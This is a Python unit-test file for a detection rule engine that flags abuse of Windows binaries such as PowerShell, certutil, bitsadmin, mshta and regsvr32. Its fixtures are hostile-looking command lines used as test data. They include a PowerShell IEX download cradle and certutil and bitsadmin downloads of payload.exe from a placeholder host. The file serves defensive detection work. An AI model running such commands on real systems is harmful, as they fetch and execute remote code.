"""Unit tests for the SentinelLOLBins deterministic rule engine (E1)."""

import os
import sys
import unittest

import pandas as pd

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from rules import rule_engine  # noqa: E402
from rules.rule_engine import (  # noqa: E402
    get_rules,
    reset_rules_cache,
    score_dataframe,
    score_event,
)


def base_row(**overrides) -> dict:
    row = {
        "record_id": "test-record-1",
        "process_name": "cmd.exe",
        "parent_process": "explorer.exe",
        "command_line": "whoami",
        "cmd_normalized": "whoami",
        "label": 0,
        "mitre_technique": None,
        "command_source": None,
        "rule_category": None,
        "dataset_origin": None,
    }
    row.update(overrides)
    return row


class TestRuleEngineLoading(unittest.TestCase):
    def setUp(self):
        reset_rules_cache()

    def test_loads_all_rule_files(self):
        rules = get_rules()
        ids = [r.get("id") for r in rules]
        self.assertGreaterEqual(len(rules), 5)
        for rule in rules:
            for key in ("id", "title", "attack", "severity", "reason", "conditions"):
                self.assertIn(key, rule, f"rule {rule.get('id')} missing '{key}'")

    def test_rule_ids_are_stable(self):
        rules = get_rules()
        ids = sorted(r["id"] for r in rules)
        self.assertIn("RULE-PS-001", ids)
        self.assertIn("RULE-PSEXEC-001", ids)


class TestScoreEvent(unittest.TestCase):
    def setUp(self):
        reset_rules_cache()

    def test_benign_event_no_match(self):
        res = score_event(base_row(
            process_name="certutil.exe",
            command_line="certutil -store My",
            cmd_normalized="certutil -store My",
        ))
        self.assertFalse(res["matched_any"])
        self.assertEqual(res["matched_rule_ids"], [])
        self.assertEqual(res["attack_ids"], [])
        self.assertIsNone(res["severity_max"])

    def test_powershell_encoded_command_matches(self):
        res = score_event(base_row(
            process_name="powershell.exe",
            parent_process="winword.exe",
            command_line="powershell.exe -EncodedCommand AAAAAB3NzaC5rZXkAb3NzaC5rZXkAb3NzaC5rZXk=",
            cmd_normalized="powershell.exe -EncodedCommand AAAAAB3NzaC5rZXkAb3NzaC5rZXkAb3NzaC5rZXk=",
        ))
        self.assertTrue(res["matched_any"])
        self.assertIn("RULE-PS-001", res["matched_rule_ids"])
        self.assertEqual(res["attack_ids"], ["T1059.001"])
        self.assertEqual(res["severity_max"], "high")

    def test_powershell_download_via_iex_matches(self):
        res = score_event(base_row(
            process_name="pwsh.exe",
            command_line="pwsh.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://x')",
            cmd_normalized="pwsh.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://x')",
        ))
        self.assertTrue(res["matched_any"])
        self.assertIn("RULE-PS-002", res["matched_rule_ids"])

    def test_wmi_process_creation_matches(self):
        res = score_event(base_row(
            process_name="wmiprvse.exe",
            parent_process="services.exe",
            command_line="wmic process call create calc.exe",
            cmd_normalized="wmic process call create calc.exe",
        ))
        self.assertTrue(res["matched_any"])
        self.assertIn("RULE-WMI-001", res["matched_rule_ids"])
        self.assertEqual(res["attack_ids"], ["T1047"])

    def test_psexec_unc_path_matches(self):
        res = score_event(base_row(
            process_name="psexec.exe",
            command_line="\\\\10.0.0.5\\share\\payload.exe -c whoami",
            cmd_normalized="\\\\10.0.0.5\\share\\payload.exe -c whoami",
        ))
        self.assertTrue(res["matched_any"])
        self.assertIn("RULE-PSEXEC-001", res["matched_rule_ids"])
        self.assertEqual(res["attack_ids"], ["T1021.002"])

    def test_mshta_file_execution_matches(self):
        res = score_event(base_row(
            process_name="mshta.exe",
            command_line="mshta.exe -File C:\\temp\\payload.hta",
            cmd_normalized="mshta.exe -File C:\\temp\\payload.hta",
        ))
        self.assertTrue(res["matched_any"])
        self.assertIn("RULE-MSHTA-001", res["matched_rule_ids"])

    def test_rundll32_from_office_parent_matches(self):
        res = score_event(base_row(
            process_name="rundll32.exe",
            parent_process="winword.exe",
            command_line="rundll32.exe script.dll,EntryPoint arg",
            cmd_normalized="rundll32.exe script.dll,EntryPoint arg",
        ))
        self.assertTrue(res["matched_any"])
        self.assertIn("RULE-RUNDLL32-001", res["matched_rule_ids"])

    def test_cmstp_installer_match(self):
        res = score_event(base_row(
            process_name="cmstp.exe",
            command_line="cmstp.exe /s /i C:\\tmp\\payload.inf /d payload",
            cmd_normalized="cmstp.exe /s /i C:\\tmp\\payload.inf /d payload",
        ))
        self.assertTrue(res["matched_any"])
        self.assertIn("RULE-CMSTP-001", res["matched_rule_ids"])

    def test_msbuild_project_match(self):
        res = score_event(base_row(
            process_name="msbuild.exe",
            command_line="msbuild.exe C:\\tmp\\build\\project.proj /t:Build",
            cmd_normalized="msbuild.exe C:\\tmp\\build\\project.proj /t:Build",
        ))
        self.assertTrue(res["matched_any"])
        self.assertIn("RULE-MSBUILD-001", res["matched_rule_ids"])

    def test_bitsadmin_add_job_match(self):
        res = score_event(base_row(
            process_name="bitsadmin.exe",
            command_line="bitsadmin /add job1 https://x/payload.exe",
            cmd_normalized="bitsadmin /add job1 https://x/payload.exe",
        ))
        self.assertTrue(res["matched_any"])
        self.assertIn("RULE-BITSADMIN-001", res["matched_rule_ids"])

    def test_regsvr32_scriptlet_match(self):
        res = score_event(base_row(
            process_name="regsvr32.exe",
            command_line="regsvr32.exe /s C:\\temp\\payload.js",
            cmd_normalized="regsvr32.exe /s C:\\temp\\payload.js",
        ))
        self.assertTrue(res["matched_any"])
        self.assertIn("RULE-REGSVR32-001", res["matched_rule_ids"])

    def test_engine_ignores_label_fields(self):
        """Rules must be behaviour-based: a malicious-shaped command on a
        benign-labelled event still matches, and vice versa."""
        mal_shaped = base_row(
            process_name="certutil.exe",
            command_line="certutil -urlcache -f http://x/payload.exe",
            cmd_normalized="certutil -urlcache -f http://x/payload.exe",
            label=1,
            mitre_technique="T1105",
        )
        self.assertTrue(score_event(mal_shaped)["matched_any"])

        ben_shaped = base_row(
            process_name="certutil.exe",
            command_line="certutil -store My",
            cmd_normalized="certutil -store My",
            label=0,
        )
        self.assertFalse(score_event(ben_shaped)["matched_any"])


class TestScoreDataFrame(unittest.TestCase):
    def setUp(self):
        reset_rules_cache()

    def test_score_dataframe_contract(self):
        df = pd.DataFrame([
            base_row(record_id="aaa", process_name="powershell.exe",
                     command_line="powershell.exe -EncodedCommand AAAAAB3NzaC5rZXkAb3NzaC5rZXkAb3NzaC5rZXk=",
                     cmd_normalized="powershell.exe -EncodedCommand AAAAAB3NzaC5rZXkAb3NzaC5rZXkAb3NzaC5rZXk="),
            base_row(record_id="bbb", process_name="cmd.exe", command_line="whoami",
                     cmd_normalized="whoami"),
        ])
        out = score_dataframe(df)
        self.assertEqual(list(out.columns), [
            "record_id", "matched_any", "n_rules_matched", "matched_rule_ids",
            "reasons", "attack_ids", "severity_max",
        ])
        self.assertEqual(len(out), 2)
        self.assertEqual(out.iloc[0]["record_id"], "aaa")
        self.assertEqual(out.iloc[0]["matched_any"], 1)
        self.assertEqual(out.iloc[0]["n_rules_matched"], 1)
        self.assertEqual(out.iloc[0]["matched_rule_ids"], "RULE-PS-001")
        self.assertTrue(out.iloc[0]["severity_max"])
        self.assertEqual(out.iloc[1]["record_id"], "bbb")
        self.assertEqual(out.iloc[1]["matched_any"], 0)
        self.assertEqual(out.iloc[1]["n_rules_matched"], 0)
        self.assertEqual(out.iloc[1]["matched_rule_ids"], "")
        self.assertEqual(out.iloc[1]["severity_max"], None)


if __name__ == "__main__":
    unittest.main()
